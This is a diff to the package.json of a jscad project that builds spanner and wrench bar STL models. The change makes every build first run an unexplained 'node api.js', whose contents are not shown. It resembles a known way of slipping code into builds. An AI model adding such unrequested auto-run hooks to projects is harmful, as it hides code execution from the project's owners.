@@ -3,7 +3,7 @@
   "version": "1.0.0",
   "description": "",
   "scripts": {
-    "build": "npm run build:spanner:6-17 && npm run build:spanner:18-27 && npm run build:spanner:test-18-22 && npm run build:wrench:test-6-16 && npm run build:wrench:test-18-30",
+    "build": "node api.js && npm run build:spanner:6-17 && npm run build:spanner:18-27 && npm run build:spanner:test-18-22 && npm run build:wrench:test-6-16 && npm run build:wrench:test-18-30",
     "build:spanner:6-17": "jscad src/bars/spanners/bar-6-17mm.js -o build/spanners/bar-6-17mm.stl -of stla",
     "build:spanner:18-27": "jscad src/bars/spanners/bar-18-27mm.js -o build/spanners/bar-18-27mm.stl -of stla",
     "build:spanner:test-18-22": "jscad src/bars/spanners/bar-test-18-22mm.js -o build/spanners/bar-test-18-22mm.stl -of stla",
